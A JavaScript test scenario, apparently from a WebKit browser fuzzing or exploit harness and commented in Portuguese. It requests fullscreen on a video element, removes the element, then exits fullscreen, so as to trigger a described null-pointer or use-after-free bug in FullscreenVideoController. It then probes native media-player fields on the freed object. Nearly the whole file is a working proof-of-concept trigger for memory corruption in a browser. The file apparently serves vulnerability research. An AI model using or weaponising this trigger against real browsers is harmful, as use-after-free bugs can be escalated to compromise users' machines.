/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Refinado via C++ Analysis)
 * Alvo: FullscreenVideoController::exitFullscreen()
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'HIGH',
    description: 'Explora o Null Pointer/UAF no FullscreenVideoController ao chamar setVisible() em um player já destruído.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.container.appendChild(this.video);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // Instancia o FullscreenVideoController no C++
            if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();
            await new Promise(r => setTimeout(r, 100));

            // FASE CRÍTICA: Destrói o m_player interno do HTMLMediaElement.cpp
            this.video.remove();

            // GATILHO DA FALHA: exitFullscreen invoca player()->setVisible()
            // Como o player foi destruído pelo remove(), o ponteiro é inválido.
            if (document.webkitExitFullscreen) document.webkitExitFullscreen();
        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.networkState,
        // Probes que forçam acesso ao objeto MediaPlayerPrivate nativo
        s => s.video.webkitDecodedFrameCount,
        s => s.video.webkitDroppedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
    }
};
